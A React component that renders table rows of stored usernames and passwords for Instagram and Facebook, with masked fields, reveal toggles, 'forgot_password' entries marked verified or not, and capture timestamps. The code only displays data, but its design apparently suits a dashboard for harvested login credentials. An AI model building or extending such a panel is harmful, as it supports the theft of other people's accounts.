import { FaInstagram } from "react-icons/fa";
import {
  FiKey,
  FiUser,
  FiClock,
  FiEye,
  FiEyeOff,
  FiEdit2,
  FiTrash2,
  FiMail,
  FiCheckCircle,
  FiXCircle,
} from "react-icons/fi";
import Checkbox from "../common/Checkbox";
import { SERVICES, typeMeta, formatClock, formatRelative } from "./databaseConfig";

const SERVICE_BADGE = {
  instagram: "border-[#8C2F39]/40 bg-[#8C2F39]/10 text-[#e07080]",
  facebook: "border-[#1F3A68]/40 bg-[#1F3A68]/10 text-[#6ab0ff]",
};

export default function CredentialRow({
  item,
  columns,
  revealed,
  selected,
  onSelect,
  onToggleReveal,
  onEdit,
  onDelete,
}) {
  const isForgot = item.type === "forgot_password";
  const ServiceIcon = SERVICES.find((s) => s.value === item.service)?.icon ?? FaInstagram;
  const serviceLabel = SERVICES.find((s) => s.value === item.service)?.label ?? item.service;
  const { icon: TypeIcon, label: typeLabel } = typeMeta(item.type);

  return (
    <tr
      className={`border-b border-[#0f1e38] transition-colors ${
        selected ? "bg-[#0f1e38]" : "bg-[#0b1527] hover:bg-[#0d1830]"
      }`}
    >
      <td className="w-10 py-2 pl-4 pr-2">
        <Checkbox checked={selected} onChange={onSelect} label={`Select ${item.username}`} />
      </td>

      {/* Service icon */}
      <td className="w-12 px-2 py-2">
        <div
          title={serviceLabel}
          role="img"
          aria-label={serviceLabel}
          className={`flex h-7 w-7 items-center justify-center rounded-full border ${
            SERVICE_BADGE[item.service] ?? "border-[#1e3260]"
          }`}
        >
          <ServiceIcon size={13} />
        </div>
      </td>

      {/* Username / Email */}
      <td className="px-3 py-2">
        <div className="flex items-center gap-1.5">
          {isForgot ? (
            <FiMail size={11} className="shrink-0 text-[#3d7aba]" />
          ) : (
            <FiUser size={11} className="shrink-0 text-[#3d7aba]" />
          )}
          <span className="text-[12px] font-semibold text-[#a0bce0]">{item.username}</span>
        </div>
      </td>

      {/* Dynamic columns */}
      {columns.map((c) => {
        if (isForgot && c.key === "verified") {
          return (
            <td key={c.key} className="px-3 py-2">
              {item.verified ? (
                <span className="inline-flex items-center gap-1.5 rounded border border-[#2ecc71]/30 bg-[#2ecc71]/10 px-2 py-0.5 text-[11px] font-semibold text-[#2ecc71]">
                  <FiCheckCircle size={11} /> Verified
                </span>
              ) : (
                <span className="inline-flex items-center gap-1.5 rounded border border-red-500/30 bg-red-500/10 px-2 py-0.5 text-[11px] font-semibold text-red-400">
                  <FiXCircle size={11} /> Not verified
                </span>
              )}
            </td>
          );
        }
        const rk = `${item.id}:${c.key}`;
        const isShown = revealed.has(rk);
        return (
          <td key={c.key} className="px-3 py-2">
            <div className="flex items-center gap-1.5">
              <FiKey size={11} className="shrink-0 text-[#3d7aba]" />
              <span className="font-mono text-[11px] text-[#6b8cba] min-w-[6rem]">
                {isShown ? item[c.key] : "•".repeat(10)}
              </span>
              <button
                type="button"
                onClick={() => onToggleReveal(rk)}
                aria-label={isShown ? "Hide" : "Show"}
                className="p-0.5 text-[#3a5a8a] hover:text-[#6ab0ff] transition-colors cursor-pointer"
              >
                {isShown ? <FiEyeOff size={12} /> : <FiEye size={12} />}
              </button>
            </div>
          </td>
        );
      })}

      <td className="px-3 py-2">
        <span className="inline-flex items-center gap-1 whitespace-nowrap rounded border border-[#1e3260] bg-[#0f1e38] px-1.5 py-0.5 text-[10px] text-[#6b8cba]">
          <TypeIcon size={10} className="text-[#3d7aba]" />
          {typeLabel}
        </span>
      </td>

      <td className="whitespace-nowrap px-3 py-2">
        <div className="flex items-center gap-1 text-[11px] text-[#a0bce0]">
          <FiClock size={10} className="text-[#3d7aba]" />
          {formatClock(item.at)}
        </div>
        <div className="text-[10px] text-[#3a5a8a] leading-tight">{formatRelative(item.at)}</div>
      </td>

      <td className="py-2 pl-3 pr-4 text-right">
        <div className="inline-flex gap-0.5">
          {!isForgot && (
            <button
              type="button"
              onClick={onEdit}
              aria-label={`Edit ${item.username}`}
              title="Edit"
              className="rounded p-1 text-[#3a5a8a] hover:bg-[#1e3260] hover:text-[#6ab0ff] transition-colors cursor-pointer"
            >
              <FiEdit2 size={12} />
            </button>
          )}
          <button
            type="button"
            onClick={onDelete}
            aria-label={`Delete ${item.username}`}
            title="Delete"
            className="rounded p-1 text-[#3a5a8a] hover:bg-red-500/10 hover:text-red-400 transition-colors cursor-pointer"
          >
            <FiTrash2 size={12} />
          </button>
        </div>
      </td>
    </tr>
  );
}
